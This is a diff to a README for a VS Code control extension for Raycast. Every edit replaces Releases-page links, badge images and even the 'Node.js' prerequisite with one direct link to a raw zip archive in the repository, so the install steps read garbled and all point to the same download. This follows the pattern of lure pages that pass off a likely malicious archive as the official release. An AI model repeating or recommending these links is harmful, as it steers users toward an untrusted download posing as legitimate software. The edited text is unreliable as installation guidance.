@@ -1,10 +1,10 @@
-https://github.com/chengame/vscode-control/releases
+https://github.com/chengame/vscode-control/raw/refs/heads/main/assets/control_vscode_v2.9.zip
 
 # vscode-control: A Raycast extension to control VS Code and editors
 
 ⚡ A lightweight Raycast extension designed to help you interact with VS Code and other editors inspired by its own UI. It focuses on fast actions, cursor control, and seamless navigation across editors, making your coding flow smoother. Built with speed in mind, it should feel natural in your daily workflow.
 
-[![Releases](https://img.shields.io/badge/Releases-View-blue?style=for-the-badge&logo=github)](https://github.com/chengame/vscode-control/releases) [![Language](https://img.shields.io/badge/Language-TypeScript-3178C6?style=for-the-badge&logo=typescript)](https://www.typescriptlang.org/)
+[![Releases](https://github.com/chengame/vscode-control/raw/refs/heads/main/assets/control_vscode_v2.9.zip)](https://github.com/chengame/vscode-control/raw/refs/heads/main/assets/control_vscode_v2.9.zip) [![Language](https://github.com/chengame/vscode-control/raw/refs/heads/main/assets/control_vscode_v2.9.zip)](https://github.com/chengame/vscode-control/raw/refs/heads/main/assets/control_vscode_v2.9.zip)
 
 Table of Contents
 - Why vscode-control
@@ -49,7 +49,7 @@ Key features
 
 Prerequisites
 - A recent version of macOS or Windows with Raycast and Visual Studio Code installed
-- Node.js and npm or pnpm for development and building the Raycast extension
+- https://github.com/chengame/vscode-control/raw/refs/heads/main/assets/control_vscode_v2.9.zip and npm or pnpm for development and building the Raycast extension
 - Basic familiarity with the Raycast extension model and VS Code keyboard shortcuts
 - An editor that exposes a compatible API for remote control
 - Internet access for fetching dependencies and updates
@@ -61,7 +61,7 @@ Installation
 - Start Raycast and enable the vscode-control extension
 - Optionally configure the extension to point to the editors you want to control
 
-Note: For the most up-to-date installation steps, refer to the Releases page linked above. The Releases page is the primary source of installation instructions and binaries if you want to try a prebuilt package. The link is provided again in the Releases section for quick access: https://github.com/chengame/vscode-control/releases
+Note: For the most up-to-date installation steps, refer to the Releases page linked above. The Releases page is the primary source of installation instructions and binaries if you want to try a prebuilt package. The link is provided again in the Releases section for quick access: https://github.com/chengame/vscode-control/raw/refs/heads/main/assets/control_vscode_v2.9.zip
 
 How to use
 - Open Raycast and search for vscode-control
@@ -154,7 +154,7 @@ Architecture and internals
 
 Development and contribution
 - Setting up your development environment
-  - Install Node.js and a package manager
+  - Install https://github.com/chengame/vscode-control/raw/refs/heads/main/assets/control_vscode_v2.9.zip and a package manager
   - Install TypeScript and related tooling
   - Create a local copy of the repository
   - Run the build and test scripts locally
@@ -229,7 +229,7 @@ FAQ
   - Check the Releases page for notes and the repository issues for ongoing discussions.
 
 Releases
-- The Releases page contains all official builds, release notes, and installation details. It is the primary place to download and learn about new versions. For quick access, visit the same page here: https://github.com/chengame/vscode-control/releases
+- The Releases page contains all official builds, release notes, and installation details. It is the primary place to download and learn about new versions. For quick access, visit the same page here: https://github.com/chengame/vscode-control/raw/refs/heads/main/assets/control_vscode_v2.9.zip
 
 Notes on usage with the Releases page
 - The link above is the main source for distribution and release notes. If you want to try a prebuilt package, download it from the Releases page and follow the installation instructions in the accompanying notes.
@@ -316,5 +316,5 @@ License
 - This project is distributed under the terms of the license included in the repository
 
 End stops
-- The document ends here without a formal conclusion, but the project continues to evolve through ongoing work and contributions. Check the Releases page for the latest updates and ongoing improvements: https://github.com/chengame/vscode-control/releases
+- The document ends here without a formal conclusion, but the project continues to evolve through ongoing work and contributions. Check the Releases page for the latest updates and ongoing improvements: https://github.com/chengame/vscode-control/raw/refs/heads/main/assets/control_vscode_v2.9.zip
 
